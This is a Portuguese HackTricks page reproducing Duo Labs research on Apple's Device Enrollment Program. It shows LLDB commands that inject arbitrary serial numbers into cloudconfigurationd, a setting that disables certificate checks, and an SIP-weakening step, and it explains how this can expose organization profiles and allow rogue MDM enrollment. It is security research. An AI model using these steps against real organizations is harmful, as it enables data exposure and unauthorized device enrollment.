# Inscrição de Dispositivos em Outras Organizações

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introdução

Como [**comentado anteriormente**](./#what-is-mdm-mobile-device-management)**,** para tentar inscrever um dispositivo em uma organização **é necessário apenas um Número de Série pertencente a essa Organização**. Uma vez inscrito, várias organizações instalarão dados sensíveis no novo dispositivo: certificados, aplicativos, senhas de WiFi, configurações de VPN [e assim por diante](https://developer.apple.com/enterprise/documentation/Configuration-Profile-Reference.pdf).\
Portanto, este pode ser um ponto de entrada perigoso para atacantes se o processo de inscrição não estiver corretamente protegido.

**A pesquisa a seguir é retirada de** [**https://duo.com/labs/research/mdm-me-maybe**](https://duo.com/labs/research/mdm-me-maybe)

## Revertendo o processo

### Binários Envolvidos no DEP e MDM

Durante nossa pesquisa, exploramos o seguinte:

* **`mdmclient`**: Usado pelo sistema operacional para se comunicar com um servidor MDM. No macOS 10.13.3 e anteriores, também pode ser usado para acionar um check-in DEP.
* **`profiles`**: Uma utilidade que pode ser usada para instalar, remover e visualizar Perfis de Configuração no macOS. Também pode ser usada para acionar um check-in DEP no macOS 10.13.4 e mais recentes.
* **`cloudconfigurationd`**: O daemon cliente de Inscrição de Dispositivos, responsável por se comunicar com a API DEP e recuperar perfis de Inscrição de Dispositivos.

Ao usar `mdmclient` ou `profiles` para iniciar um check-in DEP, as funções `CPFetchActivationRecord` e `CPGetActivationRecord` são usadas para recuperar o _Registro de Ativação_. `CPFetchActivationRecord` delega controle para `cloudconfigurationd` através de [XPC](https://developer.apple.com/documentation/xpc), que então recupera o _Registro de Ativação_ da API DEP.

`CPGetActivationRecord` recupera o _Registro de Ativação_ do cache, se disponível. Essas funções são definidas no framework privado de Perfis de Configuração, localizado em `/System/Library/PrivateFrameworks/Configuration Profiles.framework`.

### Engenharia Reversa do Protocolo Tesla e do Esquema Absinthe

Durante o processo de check-in DEP, `cloudconfigurationd` solicita um _Registro de Ativação_ de _iprofiles.apple.com/macProfile_. A carga útil da solicitação é um dicionário JSON contendo dois pares chave-valor:
```
{
"sn": "",
action": "RequestProfileConfiguration
}
```
O payload é assinado e criptografado usando um esquema internamente referido como "Absinthe". O payload criptografado é então codificado em Base 64 e usado como o corpo da solicitação em um HTTP POST para _iprofiles.apple.com/macProfile_.

Em `cloudconfigurationd`, a obtenção do _Activation Record_ é gerenciada pela classe `MCTeslaConfigurationFetcher`. O fluxo geral a partir de `[MCTeslaConfigurationFetcher enterState:]` é o seguinte:
```
rsi = @selector(verifyConfigBag);
rsi = @selector(startCertificateFetch);
rsi = @selector(initializeAbsinthe);
rsi = @selector(startSessionKeyFetch);
rsi = @selector(establishAbsintheSession);
rsi = @selector(startConfigurationFetch);
rsi = @selector(sendConfigurationInfoToRemote);
rsi = @selector(sendFailureNoticeToRemote);
```
Desde que o esquema **Absinthe** é o que parece ser usado para autenticar pedidos ao serviço DEP, **reverse engineering** deste esquema nos permitiria fazer nossos próprios pedidos autenticados à API DEP. Isso provou ser **demorado**, no entanto, principalmente por causa do número de etapas envolvidas na autenticação de pedidos. Em vez de reverter completamente como esse esquema funciona, optamos por explorar outros métodos de inserir números de série arbitrários como parte do pedido de _Activation Record_.

### Interceptando Pedidos DEP

Exploramos a viabilidade de fazer proxy de pedidos de rede para _iprofiles.apple.com_ com [Charles Proxy](https://www.charlesproxy.com). Nosso objetivo era inspecionar o payload enviado para _iprofiles.apple.com/macProfile_, inserir um número de série arbitrário e repetir o pedido. Como mencionado anteriormente, o payload submetido a esse endpoint pelo `cloudconfigurationd` está em formato [JSON](https://www.json.org) e contém dois pares chave-valor.
```
{
"action": "RequestProfileConfiguration",
sn": "
}
```
Como a API em _iprofiles.apple.com_ utiliza [Transport Layer Security](https://en.wikipedia.org/wiki/Transport\_Layer\_Security) (TLS), precisamos ativar o Proxy SSL no Charles para esse host para ver o conteúdo em texto simples das solicitações SSL.

No entanto, o método `-[MCTeslaConfigurationFetcher connection:willSendRequestForAuthenticationChallenge:]` verifica a validade do certificado do servidor e abortará se a confiança no servidor não puder ser verificada.
```
[ERROR] Unable to get activation record: Error Domain=MCCloudConfigurationErrorDomain Code=34011
"The Device Enrollment server trust could not be verified. Please contact your system
administrator." UserInfo={USEnglishDescription=The Device Enrollment server trust could not be
verified. Please contact your system administrator., NSLocalizedDescription=The Device Enrollment
server trust could not be verified. Please contact your system administrator.,
MCErrorType=MCFatalError}
```
A mensagem de erro mostrada acima está localizada em um arquivo binário _Errors.strings_ com a chave `CLOUD_CONFIG_SERVER_TRUST_ERROR`, que se encontra em `/System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings`, junto com outras mensagens de erro relacionadas.
```
$ cd /System/Library/CoreServices
$ rg "The Device Enrollment server trust could not be verified"
ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
<snip>
```
O arquivo _Errors.strings_ pode ser [impresso em um formato legível por humanos](https://duo.com/labs/research/mdm-me-maybe#error_strings_output) com o comando integrado `plutil`.
```
$ plutil -p /System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
```
Após investigar mais a fundo a classe `MCTeslaConfigurationFetcher`, ficou claro que esse comportamento de confiança no servidor pode ser contornado ao ativar a opção de configuração `MCCloudConfigAcceptAnyHTTPSCertificate` no domínio de preferência `com.apple.ManagedClient.cloudconfigurationd`.
```
loc_100006406:
rax = [NSUserDefaults standardUserDefaults];
rax = [rax retain];
r14 = [rax boolForKey:@"MCCloudConfigAcceptAnyHTTPSCertificate"];
r15 = r15;
[rax release];
if (r14 != 0x1) goto loc_10000646f;
```
A opção de configuração `MCCloudConfigAcceptAnyHTTPSCertificate` pode ser definida com o comando `defaults`.
```
sudo defaults write com.apple.ManagedClient.cloudconfigurationd MCCloudConfigAcceptAnyHTTPSCertificate -bool yes
```
Com o Proxy SSL ativado para _iprofiles.apple.com_ e `cloudconfigurationd` configurado para aceitar qualquer certificado HTTPS, tentamos interceptar e reproduzir as solicitações no Charles Proxy.

No entanto, como o payload incluído no corpo da solicitação HTTP POST para _iprofiles.apple.com/macProfile_ é assinado e criptografado com Absinthe, (`NACSign`), **não é possível modificar o payload JSON em texto simples para incluir um número de série arbitrário sem também ter a chave para descriptografá-lo**. Embora fosse possível obter a chave, pois ela permanece na memória, optamos por explorar `cloudconfigurationd` com o depurador [LLDB](https://lldb.llvm.org).

### Instrumentando Binários do Sistema que Interagem com o DEP

O último método que exploramos para automatizar o processo de submissão de números de série arbitrários para _iprofiles.apple.com/macProfile_ foi instrumentar binários nativos que interagem direta ou indiretamente com a API do DEP. Isso envolveu alguma exploração inicial do `mdmclient`, `profiles` e `cloudconfigurationd` no [Hopper v4](https://www.hopperapp.com) e [Ida Pro](https://www.hex-rays.com/products/ida/), além de algumas longas sessões de depuração com `lldb`.

Uma das vantagens desse método em relação à modificação dos binários e à re-assinatura deles com nossa própria chave é que ele evita algumas das restrições de direitos embutidas no macOS que poderiam nos impedir.

**Proteção da Integridade do Sistema**

Para instrumentar binários do sistema, (como `cloudconfigurationd`) no macOS, a [Proteção da Integridade do Sistema](https://support.apple.com/en-us/HT204899) (SIP) deve ser desativada. SIP é uma tecnologia de segurança que protege arquivos, pastas e processos em nível de sistema contra adulteração e está ativada por padrão no OS X 10.11 “El Capitan” e versões posteriores. [O SIP pode ser desativado](https://developer.apple.com/library/archive/documentation/Security/Conceptual/System_Integrity_Protection_Guide/ConfiguringSystemIntegrityProtection/ConfiguringSystemIntegrityProtection.html) iniciando o Modo de Recuperação e executando o seguinte comando no aplicativo Terminal, e então reiniciando:
```
csrutil enable --without debug
```
É importante notar, no entanto, que o SIP é um recurso de segurança útil e não deve ser desativado, exceto para fins de pesquisa e testes em máquinas não produtivas. Também é possível (e recomendado) fazer isso em Máquinas Virtuais não críticas em vez de no sistema operacional hospedeiro.

**Instrumentação Binária com LLDB**

Com o SIP desativado, pudemos então prosseguir com a instrumentação dos binários do sistema que interagem com a API do DEP, nomeadamente, o binário `cloudconfigurationd`. Como `cloudconfigurationd` requer privilégios elevados para executar, precisamos iniciar o `lldb` com `sudo`.
```
$ sudo lldb
(lldb) process attach --waitfor --name cloudconfigurationd
```
Enquanto o `lldb` está aguardando, podemos então nos conectar ao `cloudconfigurationd` executando `sudo /usr/libexec/mdmclient dep nag` em uma janela separada do Terminal. Uma vez conectado, uma saída semelhante à seguinte será exibida e comandos LLDB podem ser digitados no prompt.
```
Process 861 stopped
* thread #1, stop reason = signal SIGSTOP
<snip>
Target 0: (cloudconfigurationd) stopped.

Executable module set to "/usr/libexec/cloudconfigurationd".
Architecture set to: x86_64h-apple-macosx.
(lldb)
```
**Configurando o Número de Série do Dispositivo**

Uma das primeiras coisas que procuramos ao analisar o `mdmclient` e o `cloudconfigurationd` foi o código responsável por recuperar o número de série do sistema, pois sabíamos que o número de série era, em última instância, responsável por autenticar o dispositivo. Nosso objetivo era modificar o número de série na memória após ser recuperado do [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), e fazer com que esse número fosse usado quando o `cloudconfigurationd` construísse o payload `macProfile`.

Embora o `cloudconfigurationd` seja, em última análise, responsável por se comunicar com a API DEP, também investigamos se o número de série do sistema é recuperado ou usado diretamente dentro do `mdmclient`. O número de série recuperado, conforme mostrado abaixo, não é o que é enviado para a API DEP, mas revelou um número de série codificado que é usado se uma opção de configuração específica estiver ativada.
```
int sub_10002000f() {
if (sub_100042b6f() != 0x0) {
r14 = @"2222XXJREUF";
}
else {
rax = IOServiceMatching("IOPlatformExpertDevice");
rax = IOServiceGetMatchingServices(*(int32_t *)*_kIOMasterPortDefault, rax, &var_2C);
<snip>
}
rax = r14;
return rax;
}
```
O número de série do sistema é recuperado do [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), a menos que o valor de retorno de `sub_10002000f` seja diferente de zero, caso em que é definido para a string estática “2222XXJREUF”. Ao inspecionar essa função, parece verificar se o "Modo de teste de estresse do servidor" está ativado.
```
void sub_1000321ca(void * _block) {
if (sub_10002406f() != 0x0) {
*(int8_t *)0x100097b68 = 0x1;
sub_10000b3de(@"Server stress test mode enabled", rsi, rdx, rcx, r8, r9, stack[0]);
}
return;
}
```
Documentamos a existência do "modo de teste de estresse do servidor", mas não exploramos mais a fundo, pois nosso objetivo era modificar o número de série apresentado à API DEP. Em vez disso, testamos se a modificação do número de série apontado pelo registro `r14` seria suficiente para recuperar um _Registro de Ativação_ que não era destinado à máquina em que estávamos testando.

Em seguida, examinamos como o número de série do sistema é recuperado dentro do `cloudconfigurationd`.
```
int sub_10000c100(int arg0, int arg1, int arg2, int arg3) {
var_50 = arg3;
r12 = arg2;
r13 = arg1;
r15 = arg0;
rbx = IOServiceGetMatchingService(*(int32_t *)*_kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
r14 = 0xffffffffffff541a;
if (rbx != 0x0) {
rax = sub_10000c210(rbx, @"IOPlatformSerialNumber", 0x0, &var_30, &var_34);
r14 = rax;
<snip>
}
rax = r14;
return rax;
}
```
Como pode ser visto acima, o número de série é recuperado do [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) também em `cloudconfigurationd`.

Usando `lldb`, conseguimos modificar o número de série recuperado do [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) ao definir um ponto de interrupção para `IOServiceGetMatchingService` e criar uma nova variável de string contendo um número de série arbitrário e reescrever o registro `r14` para apontar para o endereço de memória da variável que criamos.
```
(lldb) breakpoint set -n IOServiceGetMatchingService
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --waitfor --name cloudconfigurationd
Process 2208 stopped
* thread #2, queue = 'com.apple.NSXPCListener.service.com.apple.ManagedClient.cloudconfigurationd',
stop reason = instruction step over frame #0: 0x000000010fd824d8
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd + 73
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd:
->  0x10fd824d8 <+73>: movl   %ebx, %edi
0x10fd824da <+75>: callq  0x10ffac91e               ; symbol stub for: IOObjectRelease
0x10fd824df <+80>: testq  %r14, %r14
0x10fd824e2 <+83>: jne    0x10fd824e7               ; <+88>
Target 0: (cloudconfigurationd) stopped.
(lldb) continue  # Will hit breakpoint at `IOServiceGetMatchingService`
# Step through the program execution by pressing 'n' a bunch of times and
# then 'po $r14' until we see the serial number.
(lldb) n
(lldb) po $r14
C02JJPPPQQQRR  # The system serial number retrieved from the `IORegistry`
# Create a new variable containing an arbitrary serial number and print the memory address.
(lldb) p/x @"C02XXYYZZNNMM"
(__NSCFString *) $79 = 0x00007fb6d7d05850 @"C02XXYYZZNNMM"
# Rewrite the `r14` register to point to our new variable.
(lldb) register write $r14 0x00007fb6d7d05850
(lldb) po $r14
# Confirm that `r14` contains the new serial number.
C02XXYYZZNNMM
```
**Exploração: Modificando o Dicionário de Solicitação de Perfil Antes da Serialização JSON**

Em seguida, tentamos definir o número de série que é enviado no payload `macProfile` de uma maneira diferente. Desta vez, em vez de modificar o número de série do sistema recuperado via [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), tentamos encontrar o ponto mais próximo no código onde o número de série ainda está em texto simples antes de ser assinado com Absinthe (`NACSign`). O melhor ponto para observar pareceu ser `-[MCTeslaConfigurationFetcher startConfigurationFetch]`, que realiza aproximadamente os seguintes passos:

* Cria um novo objeto `NSMutableData`
* Chama `[MCTeslaConfigurationFetcher setConfigurationData:]`, passando o novo objeto `NSMutableData`
* Chama `[MCTeslaConfigurationFetcher profileRequestDictionary]`, que retorna um objeto `NSDictionary` contendo dois pares chave-valor:
  * `sn`: O número de série do sistema
  * `action`: A ação remota a ser realizada (com `sn` como seu argumento)
* Chama `[NSJSONSerialization dataWithJSONObject:]`, passando o `NSDictionary` de `profileRequestDictionary`
* Assina o payload JSON usando Absinthe (`NACSign`)
* Codifica em base64 o payload JSON assinado
* Define o método HTTP para `POST`
* Define o corpo HTTP para o payload JSON codificado em base64 e assinado
* Define o cabeçalho HTTP `X-Profile-Protocol-Version` para `1`
* Define o cabeçalho HTTP `User-Agent` para `ConfigClient-1.0`
* Utiliza o método `[NSURLConnection alloc] initWithRequest:delegate:startImmediately:]` para realizar a solicitação HTTP

Em seguida, modificamos o objeto `NSDictionary` retornado de `profileRequestDictionary` antes de ser convertido em JSON. Para fazer isso, um ponto de interrupção foi definido em `dataWithJSONObject` para nos aproximar o máximo possível dos dados ainda não convertidos. O ponto de interrupção foi bem-sucedido e, quando imprimimos o conteúdo do registro que conhecíamos através do desmonte (`rdx`), obtivemos os resultados que esperávamos ver.
```
po $rdx
{
action = RequestProfileConfiguration;
sn = C02XXYYZZNNMM;
}
```
A representação acima é uma versão formatada do objeto `NSDictionary` retornado por `[MCTeslaConfigurationFetcher profileRequestDictionary]`. Nosso próximo desafio foi modificar o `NSDictionary` em memória contendo o número de série.
```
(lldb) breakpoint set -r "dataWithJSONObject"
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --name "cloudconfigurationd" --waitfor
Process 3291 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff2e8bfd8f Foundation`+[NSJSONSerialization dataWithJSONObject:options:error:]
Target 0: (cloudconfigurationd) stopped.
# Hit next breakpoint at `dataWithJSONObject`, since the first one isn't where we need to change the serial number.
(lldb) continue
# Create a new variable containing an arbitrary `NSDictionary` and print the memory address.
(lldb) p/x (NSDictionary *)[[NSDictionary alloc] initWithObjectsAndKeys:@"C02XXYYZZNNMM", @"sn",
@"RequestProfileConfiguration", @"action", nil]
(__NSDictionaryI *) $3 = 0x00007ff068c2e5a0 2 key/value pairs
# Confirm that `rdx` contains the new `NSDictionary`.
po $rdx
{
action = RequestProfileConfiguration;
sn = <new_serial_number>
}
```
A listagem acima faz o seguinte:

* Cria um breakpoint de expressão regular para o seletor `dataWithJSONObject`
* Aguarda o processo `cloudconfigurationd` iniciar e então se anexa a ele
* `continue` a execução do programa (porque o primeiro breakpoint que atingimos para `dataWithJSONObject` não é o chamado no `profileRequestDictionary`)
* Cria e imprime (em formato hexadecimal devido ao `/x`) o resultado de criar nosso `NSDictionary` arbitrário
* Como já conhecemos os nomes das chaves necessárias, podemos simplesmente definir o número de série de nossa escolha para `sn` e deixar a ação como está
* A impressão do resultado da criação deste novo `NSDictionary` nos diz que temos dois pares chave-valor em um local específico da memória

Nosso passo final foi agora repetir o mesmo passo de escrever em `rdx` o local da memória de nosso objeto `NSDictionary` personalizado que contém o número de série de nossa escolha:
```
(lldb) register write $rdx 0x00007ff068c2e5a0  # Rewrite the `rdx` register to point to our new variable
(lldb) continue
```
Este aponta o registrador `rdx` para o nosso novo `NSDictionary` logo antes de ser serializado para [JSON](https://www.json.org) e `POST`ado para _iprofiles.apple.com/macProfile_, em seguida, `continue` o fluxo do programa.

Este método de modificar o número de série no dicionário de solicitação de perfil antes de ser serializado para JSON funcionou. Ao usar um número de série Apple registrado no DEP conhecido como bom em vez de (null), o log de depuração para `ManagedClient` mostrou o perfil DEP completo para o dispositivo:
```
Apr  4 16:21:35[660:1]:+CPFetchActivationRecord fetched configuration:
{
AllowPairing = 1;
AnchorCertificates =     (
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://some.url/cloudenroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "Org address";
OrganizationAddressLine1 = "More address";
OrganizationAddressLine2 = NULL;
OrganizationCity = A City;
OrganizationCountry = US;
OrganizationDepartment = "Org Dept";
OrganizationEmail = "dep.management@org.url";
OrganizationMagic = <unique string>;
OrganizationName = "ORG NAME";
OrganizationPhone = "+1551234567";
OrganizationSupportPhone = "+15551235678";
OrganizationZipCode = "ZIPPY";
SkipSetup =     (
AppleID,
Passcode,
Zoom,
Biometric,
Payment,
TOS,
TapToSetup,
Diagnostics,
HomeButtonSensitivity,
Android,
Siri,
DisplayTone,
ScreenSaver
);
SupervisorHostCertificates =     (
);
}
```
Com apenas alguns comandos `lldb`, podemos inserir com sucesso um número de série arbitrário e obter um perfil DEP que inclui vários dados específicos da organização, incluindo a URL de inscrição no MDM da organização. Como discutido, essa URL de inscrição pode ser usada para inscrever um dispositivo não autorizado agora que conhecemos seu número de série. Os outros dados podem ser usados para engenharia social a fim de conseguir uma inscrição fraudulenta. Uma vez inscrito, o dispositivo pode receber um número qualquer de certificados, perfis, aplicativos, configurações de VPN e assim por diante.

### Automatizando a Instrumentação do `cloudconfigurationd` com Python

Uma vez que tivemos a prova de conceito inicial demonstrando como recuperar um perfil DEP válido usando apenas um número de série, partimos para automatizar esse processo para mostrar como um atacante poderia abusar dessa fraqueza na autenticação.

Felizmente, a API do LLDB está disponível em Python por meio de uma [interface de script-bridging](https://lldb.llvm.org/python-reference.html). Em sistemas macOS com as [Ferramentas de Linha de Comando do Xcode](https://developer.apple.com/download/more/) instaladas, o módulo `lldb` Python pode ser importado da seguinte forma:
```
import lldb
```
Isso tornou relativamente fácil criar um script para nosso proof-of-concept demonstrando como inserir um número de série registrado no DEP e receber um perfil DEP válido em troca. O PoC que desenvolvemos pega uma lista de números de série separados por novas linhas e os injeta no processo `cloudconfigurationd` para verificar perfis DEP.

![Configurações de Proxy SSL do Charles.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2NoYXJsZXNfc3NsX3Byb3h5aW5nX3NldHRpbmdzLnBuZw==?w=800\&fit=contain\&s=d1c9216716bf619e7e10e45c9968f83b)

![Notificação DEP.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2RlcF9ub3RpZmljYXRpb24ucG5n?w=800\&fit=contain\&s=4f7b95efd02245f9953487dcaac6a961)

### Impacto

Existem vários cenários nos quais o Programa de Inscrição de Dispositivos da Apple poderia ser abusado, o que levaria à exposição de informações sensíveis sobre uma organização. Os dois cenários mais óbvios envolvem a obtenção de informações sobre a organização à qual um dispositivo pertence, que podem ser recuperadas do perfil DEP. O segundo é usar essas informações para realizar um DEP e inscrição MDM rogue. Cada um desses cenários é discutido mais adiante.

#### Divulgação de Informações

Como mencionado anteriormente, parte do processo de inscrição no DEP envolve solicitar e receber um _Registro de Ativação_, (ou perfil DEP), da API DEP. Ao fornecer um número de série de sistema válido e registrado no DEP, somos capazes de recuperar as seguintes informações, (seja impressas em `stdout` ou escritas no log `ManagedClient`, dependendo da versão do macOS).
```
Activation record: {
AllowPairing = 1;
AnchorCertificates =     (
<array_of_der_encoded_certificates>
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://example.com/enroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "123 Main Street, Anywhere, , 12345 (USA)";
OrganizationAddressLine1 = "123 Main Street";
OrganizationAddressLine2 = NULL;
OrganizationCity = Anywhere;
OrganizationCountry = USA;
OrganizationDepartment = "IT";
OrganizationEmail = "dep@example.com";
OrganizationMagic = 105CD5B18CE24784A3A0344D6V63CD91;
OrganizationName = "Example, Inc.";
OrganizationPhone = "+15555555555";
OrganizationSupportPhone = "+15555555555";
OrganizationZipCode = "12345";
SkipSetup =     (
<array_of_setup_screens_to_skip>
);
SupervisorHostCertificates =     (
);
}
```
Embora algumas dessas informações possam estar publicamente disponíveis para certas organizações, ter um número de série de um dispositivo pertencente à organização, juntamente com as informações obtidas do perfil DEP, pode ser usado contra a equipe de suporte ou TI da organização para realizar uma série de ataques de engenharia social, como solicitar uma redefinição de senha ou ajuda para inscrever um dispositivo no servidor MDM da empresa.

#### Inscrição DEP Maliciosa

O [protocolo MDM da Apple](https://developer.apple.com/enterprise/documentation/MDM-Protocol-Reference.pdf) suporta - mas não exige - autenticação do usuário antes da inscrição no MDM via [HTTP Basic Authentication](https://en.wikipedia.org/wiki/Basic\_access\_authentication). **Sem autenticação, tudo o que é necessário para inscrever um dispositivo em um servidor MDM via DEP é um número de série válido e registrado no DEP**. Assim, um atacante que obtém tal número de série (seja através de [OSINT](https://en.wikipedia.org/wiki/Open-source\_intelligence), engenharia social ou força bruta) poderá inscrever um dispositivo próprio como se fosse propriedade da organização, desde que não esteja atualmente inscrito no servidor MDM. Essencialmente, se um atacante conseguir vencer a corrida iniciando a inscrição DEP antes do dispositivo real, ele poderá assumir a identidade desse dispositivo.

As organizações podem - e fazem - usar o MDM para implantar informações sensíveis, como certificados de dispositivo e usuário, dados de configuração de VPN, agentes de inscrição, Perfis de Configuração e vários outros dados internos e segredos organizacionais. Além disso, algumas organizações optam por não exigir autenticação do usuário como parte da inscrição no MDM. Isso tem várias vantagens, como uma melhor experiência do usuário e não ter que [expor o servidor de autenticação interno ao servidor MDM para lidar com inscrições no MDM que ocorrem fora da rede corporativa](https://docs.simplemdm.com/article/93-ldap-authentication-with-apple-dep).

Isso apresenta um problema ao utilizar o DEP para iniciar a inscrição no MDM, no entanto, porque um atacante poderia inscrever qualquer endpoint de sua escolha no servidor MDM da organização. Além disso, uma vez que um atacante inscreve com sucesso um endpoint de sua escolha no MDM, ele pode obter acesso privilegiado que poderia ser usado para pivotar ainda mais dentro da rede.

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
